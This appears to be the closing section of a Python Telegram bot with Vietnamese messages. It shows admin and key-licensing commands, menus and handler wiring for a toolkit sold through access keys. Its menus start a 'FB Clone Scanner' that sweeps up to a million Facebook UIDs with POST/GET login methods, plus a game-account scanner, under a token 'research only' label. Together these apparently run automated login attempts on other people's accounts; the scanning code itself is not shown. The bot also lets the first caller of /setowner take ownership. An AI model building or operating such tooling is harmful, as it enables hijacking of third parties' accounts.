    if not context.args: await update.message.reply_text("/broadcast <msg>"); return
    msg = " ".join(context.args); sent = 0
    for k in user_data_store:
        if k in ("owner","blacklist","bot_enabled","top_reset_date","shop_items","keys"): continue
        try: await context.bot.send_message(int(k), f"📢 {msg}"); sent += 1
        except Exception: pass
    await update.message.reply_text(f"✅ Đã gửi {sent} người.")

async def cmd_ban(update, context):
    if not is_admin(update.effective_user.id): return
    if not context.args: return
    try: target = int(context.args[0])
    except Exception: return
    if is_owner(target): await update.message.reply_text("❌ Không thể ban chủ bot."); return
    bl = user_data_store.setdefault("blacklist",[])
    if str(target) not in bl: bl.append(str(target)); save_global_config(); save_all_data()
    await update.message.reply_text(f"✅ Đã ban {target}.")

async def cmd_unban(update, context):
    if not is_admin(update.effective_user.id): return
    if not context.args: return
    try: target = int(context.args[0])
    except Exception: return
    bl = user_data_store.setdefault("blacklist",[])
    if str(target) in bl: bl.remove(str(target)); save_global_config(); save_all_data(); await update.message.reply_text(f"✅ Bỏ ban {target}.")
    else: await update.message.reply_text("ℹ️ Không có trong blacklist.")

async def cmd_list_ids(update, context):
    if not is_admin(update.effective_user.id): return
    users = []; banned = user_data_store.get("blacklist",[])
    for k in user_data_store:
        if k in ("owner","blacklist","bot_enabled","top_reset_date","shop_items","keys"): continue
        try: users.append(int(k))
        except Exception: pass
    lines = []
    if users: lines.append(f"📋 Hoạt động ({len(users)}):"); lines.extend(f"• `{u}`" for u in sorted(users))
    if banned: lines.append(f"\n🚫 Bị ban ({len(banned)}):"); lines.extend(f"• `{b}`" for b in banned)
    await update.message.reply_text("\n".join(lines) if lines else "Chưa có ai.", parse_mode="Markdown")

async def cmd_whois(update, context):
    if not is_admin(update.effective_user.id): return
    if not context.args: return
    try: target = int(context.args[0])
    except Exception: return
    p = user_data_store.get(str(target),{}).get("profile",{})
    if not p: await update.message.reply_text("❌ Không có dữ liệu."); return
    uname = f"@{p['username']}" if p.get("username") else "Không"
    full = f"{p.get('first_name','')} {p.get('last_name','')}".strip() or "Không"
    g = get_user_game_data(target)
    await update.message.reply_text(
        f"👤 *{target}*\n• Tên: {full}\n• Username: {uname}\n• VND: {format_money(g['balance'])}\n• IZE: {format_ize(g['ize_balance'])}",
        parse_mode="Markdown"
    )

async def cmd_channel(update, context):
    if not is_admin(update.effective_user.id): return
    if not context.args: return
    uname = context.args[0] if context.args[0].startswith("@") else "@"+context.args[0]
    try:
        chat = await context.bot.get_chat(uname)
        members = "Không rõ"
        try: members = str(await chat.get_member_count())
        except Exception: pass
        info = f"📺 {uname}\n• Tên: {chat.title}\n• Loại: {chat.type}\n• Thành viên: {members}"
        await update.message.reply_text(info)
    except BadRequest as e: await update.message.reply_text(f"❌ {e.message}")

async def cmd_setowner(update, context):
    uid = update.effective_user.id
    owner = user_data_store.get("owner",0)
    if owner == 0 or owner == uid:
        user_data_store["owner"] = uid; save_global_config(); save_all_data()
        await update.message.reply_text("✅ Bạn là chủ bot.")
    else: await update.message.reply_text("❌ Chủ bot đã được thiết lập.")

# ==================== KEY ADMIN ====================
async def cmd_genkey(update, context):
    if not is_admin(update.effective_user.id): return
    args = context.args or []

    # Parse: /genkey [duration] [quantity]
    # Ví dụ: /genkey 1d 10  → 10 key mỗi key 1 ngày
    #         /genkey 7d     → 1 key 7 ngày
    #         /genkey        → 1 key vĩnh viễn
    dur = None
    quantity = 1

    if args:
        # Kiểm tra arg cuối có phải số lượng không
        if args[-1].isdigit():
            quantity = int(args[-1])
            quantity = max(1, min(quantity, 50))  # Giới hạn 1-50 key mỗi lần
            dur = args[0] if len(args) >= 2 else None
        else:
            dur = args[0]

    # Parse tên hạn hợp lệ
    expiry = "vĩnh viễn"
    if dur:
        m = re.match(r"(\d+)\s*(s|m|h|d|w|month|year)", dur.lower())
        if m:
            expiry = f"{m.group(1)} {m.group(2)}"
        else:
            await update.message.reply_text(
                "❌ Định dạng sai.\n"
                "Dùng: /genkey [thời hạn] [số lượng]\n"
                "Ví dụ:\n"
                "• /genkey → 1 key vĩnh viễn\n"
                "• /genkey 7d → 1 key 7 ngày\n"
                "• /genkey 1d 10 → 10 key 1 ngày"
            )
            return

    # Tạo key(s)
    if quantity == 1:
        key = create_key(update.effective_user.id, dur)
        await update.message.reply_text(
            f"🔑 Key: `{key}`\n⏱️ Hết hạn: {expiry}",
            parse_mode="Markdown"
        )
    else:
        keys_list = [create_key(update.effective_user.id, dur) for _ in range(quantity)]
        lines = [f"🔑 Đã tạo *{quantity}* key | Hết hạn: *{expiry}*\n"]
        lines += [f"`{k}`" for k in keys_list]
        msg = "\n".join(lines)
        # Tách thành nhiều tin nếu quá dài (>4000 ký tự)
        if len(msg) <= 4000:
            await update.message.reply_text(msg, parse_mode="Markdown")
        else:
            chunk = [f"🔑 *{quantity}* key | Hết hạn: *{expiry}*"]
            for k in keys_list:
                chunk.append(f"`{k}`")
                if len("\n".join(chunk)) > 3800:
                    await update.message.reply_text("\n".join(chunk), parse_mode="Markdown")
                    chunk = []
            if chunk:
                await update.message.reply_text("\n".join(chunk), parse_mode="Markdown")

async def cmd_genmasterkey(update, context):
    if not is_owner(update.effective_user.id): return
    dur = context.args[0] if context.args else None
    key = create_key(update.effective_user.id, dur, is_master=True)
    expiry = "vĩnh viễn"
    if dur:
        m = re.match(r"(\d+)\s*(s|m|h|d|w|month|year)", dur.lower())
        if m: expiry = f"sau {m.group(1)} {m.group(2)}"
    await update.message.reply_text(f"👑 Key Master: `{key}`\n⏱️ Hết hạn: {expiry}", parse_mode="Markdown")

async def cmd_listkeys(update, context):
    if not is_admin(update.effective_user.id): return
    keys = user_data_store.get("keys",{})
    if not keys: await update.message.reply_text("Chưa có key nào."); return
    lines = ["📋 *Keys:*"]
    for k, v in keys.items():
        master = "👑" if v.get("is_master") else ""
        lines.append(f"{master}`{k}` → {v.get('assigned_to','chưa')} (hết: {v.get('expires_at','vĩnh viễn')})")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def cmd_keyinfo(update, context):
    if not is_admin(update.effective_user.id): return
    if not context.args: return
    info = user_data_store.get("keys",{}).get(context.args[0])
    if not info: await update.message.reply_text("Key không tồn tại."); return
    await update.message.reply_text(
        f"🔑 `{context.args[0]}`\nTạo bởi: {info['created_by']}\nNgày tạo: {info['created_at']}\n"
        f"Hết hạn: {info.get('expires_at','vĩnh viễn')}\nNgười dùng: {info.get('assigned_to','chưa')}\n"
        f"Master: {'Có' if info.get('is_master') else 'Không'}", parse_mode="Markdown"
    )

async def cmd_revokekey(update, context):
    if not is_admin(update.effective_user.id): return
    keys = user_data_store.get("keys", {})

    # /revokekey all -> thu hoi tat ca key
    if context.args and context.args[0].lower() == "all":
        count = len(keys)
        if count == 0:
            await update.message.reply_text("ℹ️ Không có key nào để thu hồi.")
            return
        # Xóa activated_key + is_master cho tất cả user đang dùng key
        for k, ki in list(keys.items()):
            assigned = ki.get("assigned_to")
            if assigned:
                u = str(assigned)
                if u in user_data_store:
                    user_data_store[u]["activated_key"] = None
                    user_data_store[u].pop("is_master", None)
                # Thông báo cho user
                try:
                    await context.bot.send_message(
                        assigned,
                        "⚠️ Key của bạn đã bị thu hồi bởi admin.\nVui lòng liên hệ để được cấp key mới."
                    )
                except Exception:
                    pass
        keys.clear()
        save_global_config()
        save_all_data()
        await update.message.reply_text(f"✅ Đã thu hồi tất cả {count} key thành công.")
        return

    # /revokekey <key> -> thu hoi 1 key
    if not context.args:
        await update.message.reply_text(
            "Cú pháp:\n/revokekey <key> — Thu hồi 1 key\n/revokekey all — Thu hồi TẤT CẢ key"
        )
        return
    key = context.args[0]
    if key not in keys:
        await update.message.reply_text("❌ Key không tồn tại.")
        return
    assigned = keys[key].get("assigned_to")
    is_master = keys[key].get("is_master", False)
    if assigned:
        u = str(assigned)
        if u in user_data_store:
            user_data_store[u]["activated_key"] = None
            if is_master:
                user_data_store[u].pop("is_master", None)
        try:
            await context.bot.send_message(
                assigned,
                "⚠️ Key của bạn đã bị thu hồi bởi admin.\nVui lòng liên hệ để được cấp key mới."
            )
        except Exception:
            pass
    del keys[key]
    save_all_data()
    save_global_config()
    msg_rev = f"✅ Đã thu hồi key `{key}`."
    if is_master:
        msg_rev += "\n👑 Đã xóa quyền Master."
    await update.message.reply_text(msg_rev, parse_mode="Markdown")

# ==================== STOP/START ====================
async def stop_all_tasks():
    for uid, rt in user_runtime.items():
        if rt.get("proxy_task") and not rt["proxy_task"].done():
            if rt.get("proxy_stop_event"): rt["proxy_stop_event"].set()
            rt["proxy_task"].cancel()
        if rt.get("monitoring"):
            rt["monitoring"] = False
            if rt.get("monitor_task"): rt["monitor_task"].cancel()
        rt.update({"proxy_task":None,"proxy_msg":None,"proxy_stop_event":None,"monitor_task":None})
    for ev in scan_lq_tasks.values(): ev.set()
    scan_lq_tasks.clear()

async def cmd_stopbot(update, context):
    if not is_admin(update.effective_user.id): await update.message.reply_text("❌"); return
    user_data_store["bot_enabled"] = False; save_global_config(); save_all_data()
    await stop_all_tasks()
    for k in user_data_store:
        if k in ("owner","blacklist","bot_enabled","top_reset_date","shop_items","keys"): continue
        try: await context.bot.send_message(int(k), "⚠️ Bot đã tắt.")
        except Exception: pass
    await update.message.reply_text("✅ Bot đã dừng. Dùng /startbot để bật lại.")

async def cmd_startbot(update, context):
    if not is_admin(update.effective_user.id): await update.message.reply_text("❌"); return
    user_data_store["bot_enabled"] = True; save_global_config(); save_all_data()
    for k in user_data_store:
        if k in ("owner","blacklist","bot_enabled","top_reset_date","shop_items","keys"): continue
        try: await context.bot.send_message(int(k), "✅ Bot đã bật lại.")
        except Exception: pass
    await update.message.reply_text("✅ Bot đã bật lại.")

# ==================== START + MENU (ĐÃ FIX) ====================
async def start(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update)
    if is_owner(uid):
        g = get_user_game_data(uid)
        await update.message.reply_text(
            f"👑 Chào chủ bot!\n🆔 ID: `{uid}`\n💰 VND: {format_money(g['balance'])}\n"
            f"💠 IZE: {format_ize(g['ize_balance'])}\n📋 /menu — Danh sách lệnh",
            parse_mode="Markdown"); return
    if not check_user_key(uid): await request_key(update, context); return
    welcome = grant_welcome_bonus(uid); daily = grant_daily_bonus(uid)
    g = get_user_game_data(uid)
    msg = (f"🎉 Chào mừng!\n🆔 ID: `{uid}`\n💰 VND: {format_money(g['balance'])}\n"
           f"💠 IZE: {format_ize(g['ize_balance'])}")
    if welcome: msg += "\n🎁 +10,000,000 VND thưởng lần đầu!"
    if daily: msg += "\n📅 +500,000 VND thưởng hàng ngày!"
    msg += "\n🔑 Key: hợp lệ\n📋 /menu — Danh sách lệnh"
    await update.message.reply_text(msg, parse_mode="Markdown")

# FIX: menu_command hiển thị đầy đủ (trước bị rỗng)
async def menu_command(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update)
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    if not is_bot_enabled() and not is_owner(uid): await update.message.reply_text("⚠️ Bot đang tạm dừng."); return
    ok, amsg = check_antispam(uid)
    if not ok: await update.message.reply_text(amsg); return
    menu_text = (
        "📋 *Danh sách lệnh:*\n\n"
        "🔧 *Công cụ:*\n"
        "/proxy — Scan Proxy (IPv4/IPv6)\n"
        "/xworld — Canh Code XWorld\n"
        "/game — Tài Xỉu (VND/IZE)\n"
        "/scanlq — Scan Acc LQ\n"
        "/fb — FB Clone Scanner\n\n"
        "💬 *Giao tiếp:*\n"
        "/chat — Chat Relay\n\n"
        "💰 *Tài chính:*\n"
        "/bank <id> <số> — Chuyển VND\n"
        "/bank ize <id> <số> — Chuyển IZE\n"
        "/convert <số> — VND→IZE\n"
        "/convertize <số> — IZE→VND\n"
        "/ize — Xem số dư IZE\n"
        "/nap <số> — Nạp IZE qua MB Bank\n"
        "/mynapcode — Mã nạp của bạn\n\n"
        "🏆 /top — Bảng xếp hạng\n"
        "🛒 /shop — Cửa hàng\n\n"
        "👮 *Admin:*\n"
        "/vnd /broadcast /ban /unban /id /whois /channel\n"
        "/genkey [thời hạn] [số lượng] — VD: /genkey 1d 10\n"
        "/revokekey all — Thu hồi toàn bộ key\n"
        "/stopbot /startbot\n\n"
        "👑 *Chủ bot:*\n"
        "/giftize /rmbank /rmvnd /genmasterkey /setowner"
    )
    await update.message.reply_text(menu_text, parse_mode="Markdown", reply_markup=main_menu_keyboard())

# ==================== BUTTON CALLBACK ====================
async def button_callback(update, context):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id; data = q.data; update_user_profile(uid, update)

    if data.startswith("shop_"):
        if data in ("shop_confirm","shop_cancel"): await shop_confirm_callback(update, context)
        else: await shop_callback(update, context)
        return
    if data.startswith("chat_"):
        await chat_callback(update, context); return
    if data == "game_currency":
        await game_currency_toggle(update, context); return

    if not is_owner(uid) and not check_user_key(uid):
        await q.edit_message_text("🔑 Bạn cần key. Hãy /start để nhập key."); return
    if chat_state["active"] and uid in chat_state["users"]:
        await q.answer("Bạn đang trong chat.", show_alert=True); return
    ok, amsg = check_antispam(uid)
    if not ok: await q.edit_message_text(amsg); return
    if not is_bot_enabled() and not is_owner(uid): await q.edit_message_text("⚠️ Bot đang tạm dừng."); return

    rt = get_user_runtime(uid)

    # MENU
    if data == "main_menu": await q.edit_message_text("🏠 Menu chính", reply_markup=main_menu_keyboard())
    elif data == "menu_proxy": await q.edit_message_text("🌐 Scan Proxy", reply_markup=proxy_menu_keyboard())
    elif data == "menu_xworld": await q.edit_message_text("🎯 XWorld", reply_markup=xworld_menu_keyboard())
    elif data == "game_menu": mk,tx = game_menu_keyboard(uid); await q.edit_message_text(tx,parse_mode="Markdown",reply_markup=mk)
    elif data == "menu_scanlq": await q.edit_message_text("🎮 Scan LQ", reply_markup=scan_lq_menu_keyboard())
    elif data == "menu_fb": await q.edit_message_text("🔓 FB Clone Scanner\n⚠️ Chỉ dùng cho mục đích nghiên cứu.", reply_markup=fb_menu_keyboard())

    # XWORLD
    elif data == "xw_settings": await q.edit_message_text("⚙️ Cài đặt XWorld", reply_markup=xw_settings_keyboard())
    elif data == "xw_add_account": context.user_data["expect_xw"] = "account_link"; await q.edit_message_text("🔗 Nhập link tài khoản XWorld (?userId=...&secretKey=...):")
    elif data == "xw_view_accounts":
        d = get_user_xworld_data(uid); accs = d.get("accounts",[])
        txt = "📋 *Tài khoản:*\n" + "\n".join(f"{i+1}. `{a['user_id']}`" for i,a in enumerate(accs)) if accs else "📭 Chưa có tài khoản."
        await q.edit_message_text(txt, parse_mode="Markdown", reply_markup=xw_settings_keyboard())
    elif data == "xw_set_threshold": context.user_data["expect_xw"] = "threshold"; await q.edit_message_text("🎚️ Nhập ngưỡng slot (VD: 5):")
    elif data == "xw_add_code": context.user_data["expect_xw"] = "code"; await q.edit_message_text("➕ Nhập code XWorld:")
    elif data == "xw_start_monitor": await start_xworld_monitor(update, context)
    elif data == "xw_stop_monitor": await stop_xworld_monitor(update, context)

    # PROXY
    elif data == "proxy_stop_scan":
        if rt.get("proxy_stop_event"): rt["proxy_stop_event"].set()
        if rt.get("proxy_task"): rt["proxy_task"].cancel()
        rt.update({"proxy_task":None,"proxy_msg":None,"proxy_stop_event":None})
        await q.edit_message_text("🛑 Đã dừng quét proxy.")
    elif data in ("proxy_check_auto","proxy_start_scan"): await run_proxy_check(update, context, False)
    elif data == "proxy_check_long": await run_proxy_check(update, context, True)
    elif data == "proxy_check_file":
        context.user_data["waiting_proxy_file"] = True; await q.edit_message_text("📎 Gửi file .txt chứa danh sách proxy.")

    # SCAN LQ
    elif data == "scanlq_quantity": context.user_data["expect_scanlq"] = "quantity"; await q.edit_message_text("Nhập số lượng acc (1-500):")
    elif data == "scanlq_infinite":
        if update.effective_chat.id in scan_lq_tasks: await q.edit_message_text("⚠️ Đang scan, hãy dừng trước.")
        else: asyncio.create_task(scan_lq_infinite(update.effective_chat.id, context)); await q.edit_message_text("♾️ Đã bắt đầu scan liên tục!")
    elif data == "scanlq_stop":
        ev = scan_lq_tasks.get(update.effective_chat.id)
        if ev: ev.set(); await q.edit_message_text("🛑 Đã dừng.")
        else: await q.edit_message_text("ℹ️ Không có scan.")

    # FB CLONE SCANNER — fb_method_ PHẢI trước fb_ generic
    elif data.startswith("fb_method_"):
        method = data.replace("fb_method_", "")  # "fb_method_A" → "A"
        context.user_data["fb_method"] = method
        context.user_data["expect_fb"] = "total"
        await q.edit_message_text(
            f"✅ Phương thức: Method {method}\n📝 Nhập số lượng UID muốn quét (VD: 500):"
        )
    elif data == "fb_stop":
        chat_id = update.effective_chat.id
        state = fb_scan_states.get(chat_id, {})
        if state.get("stop"):
            state["stop"].set()
            await q.edit_message_text("⏹️ Đã dừng quét FB.")
        else:
            await q.edit_message_text("❌ Không có tác vụ đang chạy.", reply_markup=fb_menu_keyboard())
    elif data in ("fb_A", "fb_B", "fb_C"):
        mode = data.split("_")[1]  # "fb_A" → "A"
        context.user_data["fb_mode"] = mode
        mode_labels = {"A": "Clone 2010-2014", "B": "Clone 100003/4", "C": "Clone 2009"}
        await q.edit_message_text(
            f"✅ Chế độ: {mode_labels.get(mode, mode)}\n\n🔧 Chọn phương thức đăng nhập:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⚡ Method A (POST)", callback_data="fb_method_A")],
                [InlineKeyboardButton("⚡ Method B (GET)",  callback_data="fb_method_B")],
                [InlineKeyboardButton("🔙 Quay lại",         callback_data="menu_fb")],
            ])
        )

    # GAME
    elif data == "game_setbet": await game_setbet_prompt(update, context)
    elif data == "game_input_bet": await game_input_bet(update, context)
    elif data == "game_allin": await game_allin(update, context)
    elif data == "game_tai": await play_tai_xiu(update, context, "tai")
    elif data == "game_xiu": await play_tai_xiu(update, context, "xiu")

# ==================== TEXT HANDLER ====================
async def handle_text(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update); txt = update.message.text.strip()

    # Key input
    if context.user_data.get("expect_key"):
        await process_key_input(update, context); return

    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return

    # Shop (sau khi đã kiểm tra key)
    if context.user_data.get("shop_state"):
        await handle_shop_input(update, context); return
    ok, amsg = check_antispam(uid)
    if not ok: await update.message.reply_text(amsg); return
    if not is_bot_enabled() and not is_owner(uid): await update.message.reply_text("⚠️ Bot đang tạm dừng."); return
    if is_blacklisted(uid): await update.message.reply_text("⛔ Bạn đã bị ban vĩnh viễn."); return

    # Game bet (PHẢI trước chat relay để không bị nuốt input)
    if context.user_data.get("expect_game_bet"):
        await process_game_bet_amount(update, context); return

    # Scan LQ
    if context.user_data.get("expect_scanlq"):
        try:
            qty = int(txt)
        except Exception:
            await update.message.reply_text("❌ 1-500"); return
            return
        if not (1 <= qty <= 500):
            await update.message.reply_text("❌ 1-500"); return
            return
        context.user_data.pop("expect_scanlq")
        asyncio.create_task(scan_lq_worker(update.effective_chat.id, qty, context))
        await update.message.reply_text(f"🚀 Bắt đầu scan {qty} tài khoản..."); return

    # FB Scanner
    if context.user_data.get("expect_fb") == "total":
        if not txt.isdigit(): await update.message.reply_text("❌ Nhập số nguyên."); return
        total = int(txt)
        if total < 1 or total > 1_000_000: await update.message.reply_text("❌ 1 đến 1,000,000"); return
        mode   = context.user_data.get("fb_mode","A")
        method = context.user_data.get("fb_method","A")
        context.user_data.pop("expect_fb", None)
        context.user_data.pop("fb_mode", None)
        context.user_data.pop("fb_method", None)
        chat_id = update.effective_chat.id
        stop_ev = threading.Event()
        fb_scan_states[chat_id] = {"stop": stop_ev}
        await update.message.reply_text(f"🚀 Bắt đầu quét {total} UID (Mode {mode}, Method {method})...\nKết quả sẽ hiển thị ngay tại đây.")
        loop = asyncio.get_running_loop()
        bot = context.bot   # capture bot reference (thread-safe)
        def _run():
            fb_scan_task(chat_id, mode, total, method, bot, stop_ev, loop)
            fb_scan_states.pop(chat_id, None)
        threading.Thread(target=_run, daemon=True).start()
        return

    # XWorld inputs
    if context.user_data.get("expect_xw"):
        expect = context.user_data["expect_xw"]; d = get_user_xworld_data(uid)
        if expect == "account_link":
            u, k = parse_account_link(txt)
            if u and k:
                d["accounts"].append({"user_id":u,"secret_key":k}); d["claimed_history"].setdefault(u,[]); save_all_data()
                await update.message.reply_text(f"✅ Đã thêm `{u}`.", parse_mode="Markdown", reply_markup=xw_settings_keyboard())
            else: await update.message.reply_text("❌ Link lỗi.", reply_markup=xw_settings_keyboard())
        elif expect == "threshold":
            try:
                v = int(txt)
            except Exception:
                await update.message.reply_text("❌ Phải là số nguyên dương.")
                return
            if v <= 0:
                await update.message.reply_text("❌ Ngưỡng phải lớn hơn 0.")
                return
            d["threshold"] = v
            save_all_data()
            await update.message.reply_text(f"✅ Ngưỡng mới: {v}", reply_markup=xw_settings_keyboard())
        elif expect == "code":
            info = get_code_info(txt, get_proxy_dict_for_scan())
            if info["status"]:
                if not any(c["code"]==txt for c in d["codes"]):
                    d["codes"].append({"code":txt,"info":info}); save_all_data()
                    await update.message.reply_text(f"✅ Code `{txt}` | Còn: {info['remaining']}/{info['total']}", reply_markup=xworld_menu_keyboard())
                else: await update.message.reply_text("⚠️ Đã có.", reply_markup=xworld_menu_keyboard())
            else: await update.message.reply_text(f"❌ Code lỗi: {info.get('message')}", reply_markup=xworld_menu_keyboard())
        context.user_data.pop("expect_xw"); return

    # Chat relay - sau tất cả expect states
    if chat_state["active"] and uid in chat_state["users"]:
        await handle_chat_text(update, context); return

    await update.message.reply_text("Gõ /menu để xem danh sách lệnh.")

# ==================== COMMAND SHORTCUTS ====================
async def cmd_proxy(update, context):
    if not is_owner(update.effective_user.id) and not check_user_key(update.effective_user.id): await request_key(update, context); return
    await update.message.reply_text("🌐 Scan Proxy", reply_markup=proxy_menu_keyboard())

async def cmd_xworld(update, context):
    if not is_owner(update.effective_user.id) and not check_user_key(update.effective_user.id): await request_key(update, context); return
    await update.message.reply_text("🎯 Canh Code XWorld", reply_markup=xworld_menu_keyboard())

async def cmd_game(update, context):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    mk, tx = game_menu_keyboard(uid)
    await update.message.reply_text(tx, parse_mode="Markdown", reply_markup=mk)

async def cmd_scanlq(update, context):
    if not is_owner(update.effective_user.id) and not check_user_key(update.effective_user.id): await request_key(update, context); return
    await update.message.reply_text("🎮 Scan Acc LQ", reply_markup=scan_lq_menu_keyboard())

async def cmd_fb(update, context):
    if not is_owner(update.effective_user.id) and not check_user_key(update.effective_user.id): await request_key(update, context); return
    await update.message.reply_text("🔓 FB Clone Scanner\n⚠️ Chỉ dùng cho mục đích nghiên cứu.", reply_markup=fb_menu_keyboard())

# ==================== MAIN ====================
def main():
    init_supabase()
    load_all_data()
    app = Application.builder().token(BOT_TOKEN).build()

    # Commands
    for cmd, fn in [
        ("start", start), ("menu", menu_command), ("shop", cmd_shop), ("chat", cmd_chat),
        ("proxy", cmd_proxy), ("xworld", cmd_xworld), ("game", cmd_game),
        ("scanlq", cmd_scanlq), ("fb", cmd_fb), ("top", cmd_top),
        ("bank", cmd_bank), ("vnd", cmd_vnd), ("convert", cmd_convert),
        ("convertize", cmd_convertize), ("ize", cmd_ize),
        ("giftize", cmd_giftize), ("rmbank", cmd_rmbank), ("rmvnd", cmd_rmvnd),
        ("broadcast", cmd_broadcast), ("ban", cmd_ban), ("unban", cmd_unban),
        ("id", cmd_list_ids), ("whois", cmd_whois), ("channel", cmd_channel),
        ("setowner", cmd_setowner), ("genkey", cmd_genkey),
        ("genmasterkey", cmd_genmasterkey), ("listkeys", cmd_listkeys),
        ("keyinfo", cmd_keyinfo), ("revokekey", cmd_revokekey),
        ("stopbot", cmd_stopbot), ("startbot", cmd_startbot),
        ("nap", cmd_nap), ("mynapcode", cmd_mynapcode),
    ]:
        app.add_handler(CommandHandler(cmd, fn))

    # SePay auto-check
    if SEPA_API_TOKEN and app.job_queue:
        app.job_queue.run_repeating(check_nap_transactions, interval=30, first=10)

    # Handlers
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_proxy_file_upload))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    # Global error handler
    async def error_handler(update, context):
        logger.error(f"Exception: {context.error}", exc_info=context.error)
        if update and hasattr(update, "effective_message") and update.effective_message:
            try:
                await update.effective_message.reply_text("⚠️ Lỗi hệ thống, vui lòng thử lại.")
            except Exception:
                pass
    app.add_error_handler(error_handler)

    logger.info("✅ Bot đang chạy...")
    app.run_polling(drop_pending_updates=True, allowed_updates=["message","callback_query"])

if __name__ == "__main__":
    main()
